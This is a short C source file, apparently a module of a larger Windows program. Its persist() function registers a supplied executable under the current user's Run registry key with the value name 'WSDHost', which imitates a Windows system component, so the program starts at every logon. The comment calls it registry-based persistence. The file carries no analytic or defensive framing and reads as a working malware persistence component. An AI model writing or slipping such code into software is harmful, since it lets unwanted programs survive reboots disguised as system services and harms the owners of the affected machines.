#include "persistence.h"
#include <windows.h>

void persist(const char *path) {
    HKEY k;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, 0, 0, KEY_WRITE, 0, &k, 0) == 0) {
        RegSetValueExA(k, "WSDHost", 0, REG_SZ, (const BYTE*)path, lstrlenA(path) + 1);
        RegCloseKey(k);
    }
}
// 0, = NULL
// registry based persistence